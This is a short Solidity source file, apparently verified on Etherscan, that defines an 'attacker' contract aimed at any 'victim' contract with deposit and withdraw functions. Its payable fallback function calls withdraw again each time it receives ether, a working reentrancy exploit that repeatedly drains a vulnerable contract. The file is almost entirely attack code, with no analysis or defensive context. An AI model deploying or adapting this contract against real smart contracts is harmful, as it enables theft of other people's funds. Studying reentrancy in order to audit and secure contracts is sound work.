/**
 *Submitted for verification at Etherscan.io on 2021-04-17
*/

pragma solidity 0.5.9;
// SPDX-License-Identifier: MIT
contract victim {
     function deposit() payable public returns (bool);
     function withdraw(uint amount) payable public returns (bool);
}

contract attacker{
        address public contractAddress;
        
        function setContractAddress(address _address) public returns(bool){
            contractAddress = _address;
        }
        
        function attack () public returns(bool) {
            victim vc = victim(contractAddress);
            vc.withdraw(1000000000000000);
        }
        
        function () external payable{
            victim vc = victim(contractAddress);
            vc.withdraw(1000000000000000);
        }
        
        function deposit() public payable returns (bool){
            victim vc = victim(contractAddress);
            vc.deposit();
        }
         
}